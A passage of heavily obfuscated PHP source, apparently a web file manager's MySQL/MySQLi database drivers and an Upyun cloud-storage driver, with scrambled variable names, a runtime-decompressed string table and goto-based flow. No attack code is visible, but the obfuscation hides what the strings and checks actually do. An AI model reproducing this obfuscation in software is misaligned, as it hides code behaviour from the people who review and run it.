$Á‚å˜”Ï) . $îÆäæ×[991] . implode($îÆäæ×[50], $‚ÂØµ–á) . $îÆäæ×[992]; return $this->execute($öú©óÈ); } public function insertAll($®ÏŞš‰, $Ò–şÅƒ‘ = array(), $ÑèûÙÑ¢ = false) { $ßíÂÙëâ =& $_SERVER[§Êá¸İ]; if (!is_array($®ÏŞš‰[0])) { return !1; } $•éæ¥à = array_keys($®ÏŞš‰[0]); $´Ç¼Ğ÷ê = array(); foreach ($®ÏŞš‰ as $ƒ¦µ¸ëØ) { $ÏŸıÕ× = array(); foreach ($ƒ¦µ¸ëØ as $ÑÍÊÌØ => $ÉÍæ¯Âé) { $ÉÍæ¯Âé = $this->parseValue($ÉÍæ¯Âé); if (is_scalar($ÉÍæ¯Âé)) { $ÏŸıÕ×[] = $ÉÍæ¯Âé; } } $´Ç¼Ğ÷ê[] = $ßíÂÙëâ[337] . implode($ßíÂÙëâ[50], $ÏŸıÕ×) . $ßíÂÙëâ[992]; } array_walk($•éæ¥à, array($this, $ßíÂÙëâ[993])); $Ó“´‘ëÃ = ($ÑèûÙÑ¢ ? $ßíÂÙëâ[994] : $ßíÂÙëâ[995]) . $ßíÂÙëâ[996] . $this->parseTable($Ò–şÅƒ‘[$ßíÂÙëâ[356]]) . $ßíÂÙëâ[990] . implode($ßíÂÙëâ[50], $•éæ¥à) . $ßíÂÙëâ[997] . implode($ßíÂÙëâ[50], $´Ç¼Ğ÷ê); return $this->execute($Ó“´‘ëÃ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¯ÕõÙŠ =& $_SERVER[§Êá¸İ]; $this->error = mysql_errno() . $¯ÕõÙŠ[4] . mysql_error($this->_linkID); if ($¯ÕõÙŠ[12] != $this->queryStr) { $this->error .= LNG($¯ÕõÙŠ[48]) . $this->queryStr; } think_trace($this->error, $¯ÕõÙŠ[12], $¯ÕõÙŠ[49]); return $this->error; } public function escapeString($×˜˜ÒŸ‚) { if ($this->_linkID) { return mysql_real_escape_string($×˜˜ÒŸ‚, $this->_linkID); } else { return mysql_escape_string($×˜˜ÒŸ‚); } } public function parseKey(&$§ûÕ²ÎÌ, $Ç£ŒÑ÷â = true) { $‡Çò§£Á =& $_SERVER[§Êá¸İ]; if ($Ç£ŒÑ÷â) { $§ûÕ²ÎÌ = $this->parseKeyCheck($§ûÕ²ÎÌ); } if ($§ûÕ²ÎÌ != $‡Çò§£Á[220] && !preg_match($‡Çò§£Á[998], $§ûÕ²ÎÌ)) { $§ûÕ²ÎÌ = $‡Çò§£Á[461] . trim($§ûÕ²ÎÌ, $‡Çò§£Á[461]) . $‡Çò§£Á[461]; } return $§ûÕ²ÎÌ; } } class DbMysqli extends Db { public function __construct($§îµû›´ = '') { $­™¨È¸ =& $_SERVER[§Êá¸İ]; if (!extension_loaded($­™¨È¸[999])) { think_exception(think_lang($­™¨È¸[14]) . $­™¨È¸[1000]); } if (!empty($§îµû›´)) { $this->config = $§îµû›´; if (empty($this->config[$­™¨È¸[17]])) { $this->config[$­™¨È¸[17]] = $­™¨È¸[12]; } } } public function connect($¶»¦€Œß = '', $û÷²°„ = 0) { $¥ŞÚà©ù =& $_SERVER[§Êá¸İ]; if (!isset($this->linkID[$û÷²°„])) { if (empty($¶»¦€Œß)) { $¶»¦€Œß = $this->config; } $this->linkID[$û÷²°„] = new mysqli($¶»¦€Œß[$¥ŞÚà©ù[973]], $¶»¦€Œß[$¥ŞÚà©ù[975]], $¶»¦€Œß[$¥ŞÚà©ù[976]], $¶»¦€Œß[$¥ŞÚà©ù[21]], $¶»¦€Œß[$¥ŞÚà©ù[974]] ? intval($¶»¦€Œß[$¥ŞÚà©ù[974]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÓŞ¬ñ–× = $this->linkID[$û÷²°„]->server_version; $this->linkID[$û÷²°„]->query($¥ŞÚà©ù[977] . think_config($¥ŞÚà©ù[978]) . $¥ŞÚà©ù[58]); if ($ÓŞ¬ñ–× > $¥ŞÚà©ù[979]) { $this->linkID[$û÷²°„]->query($¥ŞÚà©ù[980]); } $this->connected = !0; if (1 != think_config($¥ŞÚà©ù[22])) { unset($this->config); } } return $this->linkID[$û÷²°„]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($íâÏ«§º) { $ŠÚØÍ =& $_SERVER[§Êá¸İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $íâÏ«§º; if ($this->queryID) { $this->free(); } think_action_status($ŠÚØÍ[23], 1); think_status($ŠÚØÍ[24]); $this->queryID = $this->_linkID->query($íâÏ«§º); if ($this->_linkID->more_results()) { while (($ÈÙ÷âÓ = $this->_linkID->next_result()) != NULL) { $ÈÙ÷âÓ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($›éÊÔ½ñ) { $Ó›ŞÁ¬Š =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›éÊÔ½ñ; if ($this->queryID) { $this->free(); } think_action_status($Ó›ŞÁ¬Š[25], 1); think_status($Ó›ŞÁ¬Š[24]); $˜¤Ÿıƒ = $this->_linkID->query($›éÊÔ½ñ); $this->debug(); if (!1 === $˜¤Ÿıƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Š§È–‰¡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Š§È–‰¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $•ñ×¤áü = $this->_linkID->rollback(); $this->transTimes = 0; if (!$•ñ×¤áü) { $this->error(); return !1; } } return !0; } private function getAll() { $ì˜Í¥ = array(); if ($this->numRows > 0) { for ($åşè¤ÙŸ = 0; $åşè¤ÙŸ < $this->numRows; $åşè¤ÙŸ++) { $ì˜Í¥[$åşè¤ÙŸ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ì˜Í¥; } public function getFields($Ä­è¶Èµ) { $†Ô¡Õé =& $_SERVER[§Êá¸İ]; $”››şøñ = $this->query($†Ô¡Õé[984] . $this->parseKey($Ä­è¶Èµ)); $¹šÕÛô§ = array(); if ($”››şøñ) { foreach ($”››şøñ as $°®úï¯• => $€ÖÆàé) { $¹šÕÛô§[$€ÖÆàé[$†Ô¡Õé[31]]] = array($†Ô¡Õé[32] => $€ÖÆàé[$†Ô¡Õé[31]], $†Ô¡Õé[33] => $€ÖÆàé[$†Ô¡Õé[34]], $†Ô¡Õé[35] => (bool) ($€ÖÆàé[$†Ô¡Õé[36]] === $†Ô¡Õé[12]), $†Ô¡Õé[37] => $€ÖÆàé[$†Ô¡Õé[38]], $†Ô¡Õé[39] => strtolower($€ÖÆàé[$†Ô¡Õé[40]]) == $†Ô¡Õé[41], $†Ô¡Õé[42] => strtolower($€ÖÆàé[$†Ô¡Õé[43]]) == $†Ô¡Õé[44]); } } return $¹šÕÛô§; } public function getTables($”’Ñ Ë = '') { $É‰ÛùÄ =& $_SERVER[§Êá¸İ]; $ÍÕù¬¬ = !empty($”’Ñ Ë) ? $É‰ÛùÄ[986] . $”’Ñ Ë . $É‰ÛùÄ[987] : $É‰ÛùÄ[988]; $§Ë‡û = $this->query($ÍÕù¬¬); $è¯Á´È¦ = array(); if ($§Ë‡û) { foreach ($§Ë‡û as $áòãªŸê => $ëİìöÂ) { $è¯Á´È¦[$áòãªŸê] = current($ëİìöÂ); } } return $è¯Á´È¦; } public function replace($øõíùÓ, $í÷ó§¶Ó = array()) { $”ô…¡Ú§ =& $_SERVER[§Êá¸İ]; foreach ($øõíùÓ as $€ùÍ÷ªş => $êÃŸ»Ë) { $Å€ö¯Şã = $this->parseValue($êÃŸ»Ë); if (is_scalar($Å€ö¯Şã)) { $£ÆÄì­˜[] = $Å€ö¯Şã; $ÌÎ€û¶§[] = $this->parseKey($€ùÍ÷ªş); } } $¬şÎ‰¦» = $”ô…¡Ú§[989] . $this->parseTable($í÷ó§¶Ó[$”ô…¡Ú§[356]]) . $”ô…¡Ú§[990] . implode($”ô…¡Ú§[50], $ÌÎ€û¶§) . $”ô…¡Ú§[991] . implode($”ô…¡Ú§[50], $£ÆÄì­˜) . $”ô…¡Ú§[992]; return $this->execute($¬şÎ‰¦»); } public function insertAll($Ï›éÀ™, $÷Â¦·ĞÚ = array(), $ù¾»…Ğ— = false) { $»ã®°ŞÍ =& $_SERVER[§Êá¸İ]; if (!is_array($Ï›éÀ™[0])) { return !1; } $¤’ŒèƒÒ = array_keys($Ï›éÀ™[0]); $ß•¢»ß = array(); foreach ($Ï›éÀ™ as $³¡Ö„œô) { $Ú‚Ø­ † = array(); foreach ($³¡Ö„œô as $ô•Ñ²ï• => $ò‹—£•¨) { $ò‹—£•¨ = $this->parseValue($ò‹—£•¨); if (is_scalar($ò‹—£•¨)) { $Ú‚Ø­ †[] = $ò‹—£•¨; } } $ß•¢»ß[] = $»ã®°ŞÍ[337] . implode($»ã®°ŞÍ[50], $Ú‚Ø­ †) . $»ã®°ŞÍ[992]; } array_walk($¤’ŒèƒÒ, array($this, $»ã®°ŞÍ[993])); $ç…ğöõç = $ù¾»…Ğ— ? $»ã®°ŞÍ[994] : $»ã®°ŞÍ[995]; $éåµ¾Ğ– = $ç…ğöõç . $»ã®°ŞÍ[996] . $this->parseTable($÷Â¦·ĞÚ[$»ã®°ŞÍ[356]]) . $»ã®°ŞÍ[990] . implode($»ã®°ŞÍ[50], $¤’ŒèƒÒ) . $»ã®°ŞÍ[997] . implode($»ã®°ŞÍ[50], $ß•¢»ß); return $this->execute($éåµ¾Ğ–); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $×çéæåâ =& $_SERVER[§Êá¸İ]; $this->error = $this->_linkID->errno . $×çéæåâ[4] . $this->_linkID->error; if ($×çéæåâ[12] != $this->queryStr) { $this->error .= LNG($×çéæåâ[48]) . $this->queryStr; } think_trace($this->error, $×çéæåâ[12], $×çéæåâ[49]); return $this->error; } public function escapeString($İƒ´û»é) { if ($this->_linkID) { return $this->_linkID->real_escape_string($İƒ´û»é); } else { return addslashes($İƒ´û»é); } } public function parseKey(&$ÒÊˆ–„º, $·äÌÛÀü = true) { $ûæÙ¬« =& $_SERVER[§Êá¸İ]; if ($·äÌÛÀü) { $ÒÊˆ–„º = $this->parseKeyCheck($ÒÊˆ–„º); } if ($ÒÊˆ–„º != $ûæÙ¬«[220] && !preg_match($ûæÙ¬«[998], $ÒÊˆ–„º)) { $ÒÊˆ–„º = $ûæÙ¬«[461] . trim($ÒÊˆ–„º, $ûæÙ¬«[461]) . $ûæÙ¬«[461]; } return $ÒÊˆ–„º; } } goto cĞ©òëéÍ; FÙ´Éù³Ó¡: $_SERVER[ÌÛŒïÀ] = explode($_SERVER[§Êá¸İ][689], gzinflate(substr($_SERVER[§Êá¸İ][690], 10, -8))); $gptfedaojn = $_SERVER[§Êá¸İ][691]; if (strlen($gptfedaojn) < $_SERVER[§Êá¸İ][692]) { return; } goto DÀİà³…‹§; BŠÏÀŒÉåÈ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\57\166\x30\56\x61\x70\151\x2e\165\160\171\x75\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ô—Ø‹ÔÄ) { parent::__construct(); $this->_init($ô—Ø‹ÔÄ); } public function _init($ù÷ê¥) { $ôğ§Ší =& $_SERVER[§Êá¸İ]; foreach ($ù÷ê¥ as $üŠéÓ§Ò => $„üº°¦ğ) { if (isset($this->{$üŠéÓ§Ò})) { $this->{$üŠéÓ§Ò} = $„üº°¦ğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ôğ§Ší[1553] . LNG($ôğ§Ší[1472])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¹ï·Ö£œ, $•°®İÉ = "\107\x45\124") { $¦ú¦»–¬ =& $_SERVER[§Êá¸İ]; $¼ˆ’­« = gmdate($¦ú¦»–¬[1501]); $´÷„¬¦ = base64_encode(hash_hmac($¦ú¦»–¬[1554], "{$•°®İÉ}\46{$¹ï·Ö£œ}\x26{$¼ˆ’­«}", md5("{$this->userpass}"), !0)); $ÒóµÒ î = array("\x41\165\164\150\x6f\x72\x69\x7a\x61\x74\151\x6f\x6e\x3a\x55\120\131\x55\116\40{$this->username}\72{$´÷„¬¦}", "\104\141\x74\x65\x3a{$¼ˆ’­«}"); return $ÒóµÒ î; } public function ussRequest($à€ı—İ¯, $•¯æ°ö³ = "\107\105\x54", $®ÜÛĞŸ = false, $œ°×—æ³ = false, $ÄÆö†½í = false) { $ˆ íß =& $_SERVER[§Êá¸İ]; $à€ı—İ¯ = trim($à€ı—İ¯, $ˆ íß[8]); $ÖŠÉ·— = "\57{$this->bucket}\x2f{$à€ı—İ¯}"; $‘ˆ©šÍ… = $this->ussHeaders($ÖŠÉ·—, $•¯æ°ö³); if ($œ°×—æ³) { $‘ˆ©šÍ… = array_merge($‘ˆ©šÍ…, $œ°×—æ³); } $¦Œñç¿ = url_request($this->endpoint . $ÖŠÉ·—, $•¯æ°ö³, $®ÜÛĞŸ, $‘ˆ©šÍ…, $ÄÆö†½í); if (!$¦Œñç¿) { $ÄÁŠÂ¶ß = LNG($ˆ íß[1555]); $this->writeLog($ÄÁŠÂ¶ß); return array($ˆ íß[1307] => !1, $ˆ íß[1297] => $ÄÁŠÂ¶ß); } if (strtolower($•¯æ°ö³) == $ˆ íß[227] || in_array($¦Œñç¿[$ˆ íß[1307]], array($ˆ íß[274], $ˆ íß[1556]))) { $®ÜÛĞŸ = $¦Œñç¿[$ˆ íß[1557]]; } else { $®ÜÛĞŸ = json_decode($¦Œñç¿[$ˆ íß[1297]], !0); if (!$®ÜÛĞŸ) { $®ÜÛĞŸ = $¦Œñç¿[$ˆ íß[1297]]; } else { if (!$¦Œñç¿[$ˆ íß[837]] && isset($®ÜÛĞŸ[$ˆ íß[1558]])) { $®ÜÛĞŸ = $®ÜÛĞŸ[$ˆ íß[1558]]; } } } if (!$¦Œñç¿[$ˆ íß[837]]) { $this->writeLog($this->__errorMessage($®ÜÛĞŸ)); } return array($ˆ íß[1307] => $¦Œñç¿[$ˆ íß[837]], $ˆ íß[1297] => $®ÜÛĞŸ); } private function __errorMessage($È¯Œ¯æë) { $·ºñåØº =& $_SERVER[§Êá¸İ]; if (!$È¯Œ¯æë) { return $·ºñåØº[12]; } static $Èª™åï  = null; if (!$Èª™åï ) { $Èª™åï  = I18n::getType(); } if ($Èª™åï  != $·ºñåØº[1511]) { return $È¯Œ¯æë; } $²’üË×® = array($·ºñåØº[1559] => $·ºñåØº[1560], $·ºñåØº[1561] => $·ºñåØº[1562], $·ºñåØº[1563] => $·ºñåØº[1562], $·ºñåØº[1564] => $·ºñåØº[1565], $·ºñåØº[1566] => $·ºñåØº[1567], $·ºñåØº[1568] => $·ºñåØº[1569], $·ºñåØº[1570] => $·ºñåØº[1571]); return isset($²’üË×®[$È¯Œ¯æë]) ? $²’üË×®[$È¯Œ¯æë] : $È¯Œ¯æë; } public function mkfile($üÂŠó¼‹, $Æğ³ĞğÉ = '', $ÌÁ³ë×Ó = REPEAT_RENAME) { if ($this->setContent($üÂŠó¼‹, $Æğ³ĞğÉ)) { return $this->getPathOuter($üÂŠó¼‹); } return !1; } public function mkdir($¤©‰Ïš, $Õ’¾•Ö = REPEAT_SKIP) { $²ıøş·Ñ =& $_SERVER[§Êá¸İ]; $šìéÂ–• = trim($¤©‰Ïš, $²ıøş·Ñ[8]); if ($this->_isFolder($šìéÂ–•)) { return $this->getPathOuter($šìéÂ–•); } $×Ÿåš×ì = array($²ıøş·Ñ[1572]); $åñÌ²Íñ = $this->ussRequest($šìéÂ–•, $²ıøş·Ñ[257], !1, $×Ÿåš×ì); return $åñÌ²Íñ[$²ıøş·Ñ[1307]] ? $this->getPathOuter($šìéÂ–•) : !1; } public function copyFile($ŠÇ©°ó¾, $ç“˜”ÜÓ) { $ø¤’‚Ìø =& $_SERVER[§Êá¸İ]; $õÁ¨†ñÊ = array($ø¤’‚Ìø[1573] . "\57{$this->bucket}\x2f{$ŠÇ©°ó¾}", $ø¤’‚Ìø[1574]); $ƒ‘è›ØÉ = $this->ussRequest($ç“˜”ÜÓ, $ø¤’‚Ìø[259], !1, $õÁ¨†ñÊ); return $ƒ‘è›ØÉ[$ø¤’‚Ìø[1307]] ? !0 : $this->getPathOuter($ç“˜”ÜÓ); } public function moveFile($æèŞŒ²ö, $É©Ğ“ª ) { $˜©ïñ¹ =& $_SERVER[§Êá¸İ]; $•¹¶ÓÍ = array($˜©ïñ¹[1575] . "\57{$this->bucket}\57{$æèŞŒ²ö}", $˜©ïñ¹[1574]); $úê¹ˆ²¿ = $this->ussRequest($É©Ğ“ª , $˜©ïñ¹[259], !1, $•¹¶ÓÍ); return $úê¹ˆ²¿[$˜©ïñ¹[1307]] ? !0 : $this->getPathOuter($É©Ğ“ª ); } public function delFile($ÚÃ™‘â€) { $–ì‡€Ã´ =& $_SERVER[§Êá¸İ]; $Ôá‰±Ø = $this->ussRequest($ÚÃ™‘â€, $–ì‡€Ã´[1576]); return $Ôá‰±Ø[$–ì‡€Ã´[1307]] ? !0 : !1; } public function delFolder($ŸÑ¾ùì«) { $·¤êœóâ =& $_SERVER[§Êá¸İ]; if (!$this->exist($ŸÑ¾ùì«)) { return !0; } $this->listItemCache = !1; $’µíÍÜ“ = $ÑÀ“”­ = array(); $this->fileList($ŸÑ¾ùì«, $’µíÍÜ“, $ÑÀ“”­, !0); $this->listItemCache = !0; foreach ($ÑÀ“”­ as $ã‡ıŸàã) { $¸öÜšŸ = $this->ussRequest($ã‡ıŸàã[$·¤êœóâ[32]], $·¤êœóâ[1576]); if (!$¸öÜšŸ[$·¤êœóâ[1307]]) { return !1; } } foreach ($’µíÍÜ“ as $ÙãÉíğá) { $¸öÜšŸ = $this->ussRequest($ÙãÉíğá, $·¤êœóâ[1576]); if (!$¸öÜšŸ[$·¤êœóâ[1307]]) { return !1; } } $¸öÜšŸ = $this->ussRequest($ŸÑ¾ùì«, $·¤êœóâ[1576]); return $¸öÜšŸ[$·¤êœóâ[1307]]; } public function rename($Ş‡Ô¦í, $Êß¤öåñ) { if ($this->isFile($Ş‡Ô¦í)) { $Êß¤öåñ = get_path_father($Ş‡Ô¦í) . $Êß¤öåñ; return $this->moveFile($Ş‡Ô¦í, $Êß¤öåñ); } return $this->renameObject($Ş‡Ô¦í, $Êß¤öåñ); } public function fileInfo($—ä¬ÖÍ—, $ÌƒÀË£Ó = false, $—¡ëÖƒú = array()) { $ãáî½‡€ =& $_SERVER[§Êá¸İ]; $ÇªÖïŒ = array($ãáî½‡€[32] => $this->pathThis($—ä¬ÖÍ—), $ãáî½‡€[87] => $this->getPathOuter($ãáî½‡€[8] . $—ä¬ÖÍ—), $ãáî½‡€[33] => $ãáî½‡€[230], $ãáî½‡€[79] => isset($—¡ëÖƒú[$ãáî½‡€[79]]) ? $—¡ëÖƒú[$ãáî½‡€[79]] : 0, $ãáî½‡€[169] => $this->ext($—ä¬ÖÍ—)); if ($ÌƒÀË£Ó) { return $ÇªÖïŒ; } $ÇªÖïŒ[$ãáî½‡€[231]] = $ÇªÖïŒ[$ãáî½‡€[88]] = 0; $ÇªÖïŒ[$ãáî½‡€[232]] = $ÇªÖïŒ[$ãáî½‡€[233]] = !0; if (empty($—¡ëÖƒú)) { $—¡ëÖƒú = $this->objectMeta($—ä¬ÖÍ—); if (!$—¡ëÖƒú) { return $ÇªÖïŒ; } } $ÇªÖïŒ[$ãáî½‡€[231]] = intval($—¡ëÖƒú[$ãáî½‡€[1577]]); $ÇªÖïŒ[$ãáî½‡€[88]] = intval($—¡ëÖƒú[$ãáî½‡€[1578]]); $ÇªÖïŒ[$ãáî½‡€[79]] = $—¡ëÖƒú[$ãáî½‡€[79]]; return $ÇªÖïŒ; } public function folderInfo($¢µÄĞ¯, $ªıä¹ú = false) { $Éª”Ÿëô =& $_SERVER[§Êá¸İ]; $ïÎä¶²¬ = array($Éª”Ÿëô[32] => $this->pathThis($¢µÄĞ¯), $Éª”Ÿëô[87] => $this->getPathOuter($Éª”Ÿëô[8] . $¢µÄĞ¯), $Éª”Ÿëô[33] => $Éª”Ÿëô[78]); if ($ªıä¹ú) { return $ïÎä¶²¬; } $ïÎä¶²¬[$Éª”Ÿëô[231]] = $ïÎä¶²¬[$Éª”Ÿëô[88]] = 0; $ïÎä¶²¬[$Éª”Ÿëô[232]] = $ïÎä¶²¬[$Éª”Ÿëô[233]] = !0; if (empty($é³ûÍÒ)) { $é³ûÍÒ = $this->objectMeta($¢µÄĞ¯); if (!$é³ûÍÒ) { return $ïÎä¶²¬; } } $ïÎä¶²¬[$Éª”Ÿëô[231]] = intval($é³ûÍÒ[$Éª”Ÿëô[1577]]); $ïÎä¶²¬[$Éª”Ÿëô[88]] = intval($é³ûÍÒ[$Éª”Ÿëô[1578]]); return $ïÎä¶²¬; } private function listObjs($‘‰ÍÅúµ, $¶•·éäû = 0, $«çúŠ› = 1000) { $éÖ…Ò³ˆ =& $_SERVER[§Êá¸İ]; $¢ˆé¸¼‘ = array($éÖ…Ò³ˆ[1579], $éÖ…Ò³ˆ[1580] . $«çúŠ›); if ($¶•·éäû) { $¢ˆé¸¼‘[] = $éÖ…Ò³ˆ[1581] . $¶•·éäû; } $„¨İª´ = $this->ussRequest($‘‰ÍÅúµ, $éÖ…Ò³ˆ[261], !1, $¢ˆé¸¼‘); return !$„¨İª´[$éÖ…Ò³ˆ[1307]] ? !1 : $„¨İª´[$éÖ…Ò³ˆ[1297]]; } private function fileList($‡è©±ºº, &$çĞã‡„Á, &$èæò¶öà, $±…Ìøñ = false) { $Âİ»¬ñí =& $_SERVER[§Êá¸İ]; $åÅÓš¦ = $Âİ»¬ñí[12]; $Ç¯Ù÷¾„ = 1000; $ÌüßšÅã = rtrim($‡è©±ºº, $Âİ»¬ñí[8]) . $Âİ»¬ñí[8]; while (!0) { check_abort(); $©à´Í«Ğ = $this->listObjs($‡è©±ºº, $åÅÓš¦, $Ç¯Ù÷¾„); if (!$©à´Í«Ğ) { return !1; } $åÅÓš¦ = isset($©à´Í«Ğ[$Âİ»¬ñí[1582]]) ? $©à´Í«Ğ[$Âİ»¬ñí[1582]] : $Âİ»¬ñí[12]; $İ‚û—•° = isset($©à´Í«Ğ[$Âİ»¬ñí[1583]]) ? $©à´Í«Ğ[$Âİ»¬ñí[1583]] : array(); foreach ($İ‚û—•° as $Ãşäå³„) { $­³°Š”Í = $Ãşäå³„[$Âİ»¬ñí[33]] == $Âİ»¬ñí[78] ? !0 : !1; $ŞÀ²¹œ• = ltrim($ÌüßšÅã . $Ãşäå³„[$Âİ»¬ñí[32]], $Âİ»¬ñí[8]) . ($­³°Š”Í ? $Âİ»¬ñí[8] : $Âİ»¬ñí[12]); $çëŒ”¤œ = array($Âİ»¬ñí[32] => $ŞÀ²¹œ•, $Âİ»¬ñí[33] => $­³°Š”Í ? $Âİ»¬ñí[78] : $Âİ»¬ñí[230], $Âİ»¬ñí[79] => $Ãşäå³„[$Âİ»¬ñí[413]], $Âİ»¬ñí[1578] => $Ãşäå³„[$Âİ»¬ñí[1584]]); $this->cacheMethodInfoSet($ŞÀ²¹œ•, $­³°Š”Í, $çëŒ”¤œ); if ($­³°Š”Í) { $çĞã‡„Á[] = $ŞÀ²¹œ•; if ($±…Ìøñ) { $this->fileList($ŞÀ²¹œ•, $çĞã‡„Á, $èæò¶öà, $±…Ìøñ); } continue; } $èæò¶öà[] = $çëŒ”¤œ; } if (count($İ‚û—•°) < $Ç¯Ù÷¾„) { break; } } $this->cacheMethodInfoSet($‡è©±ºº, !0); } public function listPath($š¼³ª÷—, $ƒ†İ“¾Ş = false) { $³ÁÈîëÄ =& $_SERVER[§Êá¸İ]; $«„²¢„Ñ = $ùùÒÌüÚ = array(); $this->fileList($š¼³ª÷—, $«„²¢„Ñ, $ùùÒÌüÚ); foreach ($«„²¢„Ñ as $²˜Ã˜ªî => $™’©ìÇˆ) { $«„²¢„Ñ[$²˜Ã˜ªî] = $this->folderInfo($™’©ìÇˆ, $ƒ†İ“¾Ş); } foreach ($ùùÒÌüÚ as $²˜Ã˜ªî => $™’©ìÇˆ) { $ùùÒÌüÚ[$²˜Ã˜ªî] = $this->fileInfo($™’©ìÇˆ[$³ÁÈîëÄ[32]], $ƒ†İ“¾Ş, $™’©ìÇˆ); } return array($³ÁÈîëÄ[85] => $«„²¢„Ñ, $³ÁÈîëÄ[86] => $ùùÒÌüÚ); } public function has($ª¡¨ÓÖª, $ÆĞ®Úß = false, $„ğ‘Ù§„ = true) { $£„¾°É =& $_SERVER[§Êá¸İ]; $í‚’Š×• = $£„¾°É[12]; $„À¬Ã©¡ = 500; $İ¨·©¥É = 0; $³ÄÊØÑï = 0; $ãäéÑí­ = rtrim($ª¡¨ÓÖª, $£„¾°É[8]) . $£„¾°É[8]; while (!0) { check_abort(); $÷’´ó‘ = $this->listObjs($ª¡¨ÓÖª, $í‚’Š×•, $„À¬Ã©¡); if (!$÷’´ó‘) { return !1; } $í‚’Š×• = isset($÷’´ó‘[$£„¾°É[1582]]) ? $÷’´ó‘[$£„¾°É[1582]] : $£„¾°É[12]; $À‹îÖÚ = isset($÷’´ó‘[$£„¾°É[1583]]) ? $÷’´ó‘[$£„¾°É[1583]] : array(); if (empty($À‹îÖÚ)) { break; } $Ê¡™ĞÁŸ = array_filter($À‹îÖÚ, function ($€„å­›ë) { $Ó«³×‘Ÿ =& $_SERVER[§Êá¸İ]; return $€„å­›ë[$Ó«³×‘Ÿ[33]] == $Ó«³×‘Ÿ[78]; }); $¬°·Öæ = count($À‹îÖÚ); $Ê¡™ĞÁŸ = count($Ê¡™ĞÁŸ); $Å¼šşÇî = $¬°·Öæ - $Ê¡™ĞÁŸ; if ($ÆĞ®Úß) { $³ÄÊØÑï += $Ê¡™ĞÁŸ; $İ¨·©¥É += $Å¼šşÇî; if ($¬°·Öæ < $„À¬Ã©¡) { break; } continue; } if ($„ğ‘Ù§„) { if ($Å¼šşÇî) { return !0; } } else { if ($Ê¡™ĞÁŸ) { return !0; } } if ($¬°·Öæ < $„À¬Ã©¡) { break; } } if ($ÆĞ®Úß) { return array($£„¾°É[239] => $İ¨·©¥É, $£„¾°É[240] => $³ÄÊØÑï); } return !1; } public function listAll($ªâ›ğĞÏ) { $èŞ€Š£² =& $_SERVER[§Êá¸İ]; $Ë‹›Áş¹ = $®Í¿ê¤  = array(); $this->fileList($ªâ›ğĞÏ, $Ë‹›Áş¹, $®Í¿ê¤ , !0); $±Šö‘ş = array_to_keyvalue($®Í¿ê¤ , $èŞ€Š£²[32]); foreach ($Ë‹›Áş¹ as $ïÆ“Ø‹) { if (is_string($ïÆ“Ø‹)) { $±Šö‘ş[$ïÆ“Ø‹] = array($èŞ€Š£²[79] => 0); } } return $this->listAllFiles($ªâ›ğĞÏ, $±Šö‘ş); } public function canRead($’Ê¹„«) { return $this->exist($’Ê¹„«) ? !0 : !1; } public function canWrite($ä¦ğ€ïÕ) { return $this->exist($ä¦ğ€ïÕ) ? !0 : !1; } public function getContent($í»×ŠüĞ) { return $this->fileSubstr($í»×ŠüĞ, 0, -1); } public function setContent($şº™¼ÀÔ, $”ˆ™½úÇ = '') { $ÚŒİôÎó =& $_SERVER[§Êá¸İ]; if (!$”ˆ™½úÇ) { $¿ ôÊ² = $this->ussRequest($şº™¼ÀÔ, $ÚŒİôÎó[257]); return $¿ ôÊ²[$ÚŒİôÎó[1307]]; } $µÛ‹â = $this->tempFile($this->pathThis($şº™¼ÀÔ)); file_put_contents($µÛ‹â, $”ˆ™½úÇ); if ($this->upload($şº™¼ÀÔ, $µÛ‹â)) { $this->tempFileRemve($µÛ‹â); return !0; } return !1; } public function fileSubstr($ö‘–‹­Œ, $Ÿ¦´Õ£ş, $ËŒÕêô­) { $ÈòÈüªÑ =& $_SERVER[§Êá¸İ]; if (!($º®£¿– = $this->link($ö‘–‹­Œ))) { return !1; } $¨´øÌÃ = !1; if ($ËŒÕêô­ > 0) { $Ç²Äï€³ = $Ÿ¦´Õ£ş + $ËŒÕêô­ - 1; $¨´øÌÃ = array($ÈòÈüªÑ[1543] . $Ÿ¦´Õ£ş . $ÈòÈüªÑ[462] . $Ç²Äï€³); } $†§¥Œâ = url_request($º®£¿–, $ÈòÈüªÑ[261], !1, $¨´øÌÃ); return $†§¥Œâ[$ÈòÈüªÑ[837]] ? $†§¥Œâ[$ÈòÈüªÑ[1297]] : !1; } public function upload($ºö€á‰¸, $ëéÈşß˜, $ç§õÊ†‘ = false, $ğûİıÖ¢ = REPEAT_REPLACE) { $Êñ™•× =& $_SERVER[§Êá¸İ]; $ëì»ŒÆå = IO::size($ëéÈşß˜); if ($ëì»ŒÆå <= 1024 * 1024 * 200) { $˜Üì“ = array($Êñ™•×[1585] . $ëéÈşß˜); $ÜÑ¤şôô = $this->ussRequest($ºö€á‰¸, $Êñ™•×[259], $˜Üì“); return $ÜÑ¤şôô[$Êñ™•×[1307]] ? $this->getPathOuter($ºö€á‰¸) : !1; } $Š—Ï±ÔÕ = 1024 * 1024 * 